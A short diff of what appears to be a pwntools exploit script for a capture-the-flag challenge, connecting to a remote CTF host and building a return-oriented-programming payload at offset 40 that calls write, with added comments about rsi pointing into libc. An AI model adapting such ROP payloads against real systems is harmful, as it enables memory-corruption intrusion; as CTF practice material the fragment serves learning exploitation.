@@ -14,7 +14,8 @@ call _write
 io = remote("host.cg21.metaproblems.com",3030)
 
 payload = flat({
-	40: [
+	40: [ 	# rsi point to addr in libc
+		# it available to use
 		ret,
 		write,
 		p64(0)*3,
